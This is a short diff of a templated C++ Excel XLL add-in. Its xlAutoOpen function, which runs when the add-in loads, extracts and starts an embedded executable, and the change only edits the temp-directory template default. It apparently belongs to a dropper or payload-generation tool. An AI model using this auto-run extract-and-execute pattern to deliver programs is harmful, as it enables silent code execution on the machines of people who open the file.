@@ -367,7 +367,7 @@ __declspec(dllexport) int __stdcall xlAutoOpen() {
 
 {{if eq .Embed.Mode "exe_in_xll"}}
         // EMBEDDED MODE: Extract and use the embedded Executable
-        std::string extractedExe = embed::ExtractAndStartExe("{{withDefault .Embed.TempDir "${TEMP}"}}");
+        std::string extractedExe = embed::ExtractAndStartExe("{{.Embed.TempDir}}");
         std::wstring exePath;
         if (!extractedExe.empty()) {
             exePath = StringToWString(extractedExe);
